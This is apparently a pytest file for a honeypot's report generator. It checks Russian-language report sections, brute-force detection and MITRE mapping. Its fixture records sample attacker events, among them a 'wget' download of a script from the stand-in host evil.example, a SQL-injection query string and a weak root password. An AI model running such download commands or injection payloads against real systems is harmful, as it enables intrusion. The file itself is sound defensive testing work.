from honeypot.analysis.report import build_report, cell, save_report, table
from honeypot.events import Event, AUTH, COMMAND, HTTP_REQUEST
from honeypot.storage.db import Storage


def make_db(tmp_path):
    db = Storage(tmp_path / "t.db")
    db.save(Event("ssh", AUTH, "185.10.1.5", session_id="a",
                  payload={"user": "root", "password": "123456",
                           "success": True}))
    db.save(Event("ssh", COMMAND, "185.10.1.5", session_id="a",
                  payload={"cmd": "wget http://evil.example/x.sh"}))
    db.save(Event("http", HTTP_REQUEST, "8.8.8.8", session_id="b",
                  payload={"path": "/", "query": "id=1' or 1=1--",
                           "body": "", "attacks": ["sqli"]}))
    return db


def test_cell_and_table():
    assert cell("a|b\nc") == "a\\|b c"
    assert "a\\|b" in table(["x"], [("a|b",)])


def test_report_sections(tmp_path):
    text = build_report(make_db(tmp_path))
    assert "# Отчёт honeypot" in text
    assert "## География IP" in text
    assert "## Страны" in text
    assert "## Провайдеры" in text
    assert "RU" in text
    assert "T1110" in text  # перебор паролей попал в MITRE


def test_bruteforce_section(tmp_path):
    db = make_db(tmp_path)
    for i in range(3):
        db.save(Event("ssh", AUTH, "6.6.6.6", session_id=f"b{i}",
                      payload={"success": False}))
    text = build_report(db)
    assert "## IP с перебором паролей" in text
    assert "6.6.6.6" in text


def test_empty_report(tmp_path):
    text = build_report(Storage(tmp_path / "e.db"))
    assert "Событий пока нет." in text


def test_save_report(tmp_path):
    path = tmp_path / "out" / "r.md"
    save_report(make_db(tmp_path), path)
    assert path.read_text(encoding="utf-8").startswith("# Отчёт honeypot")
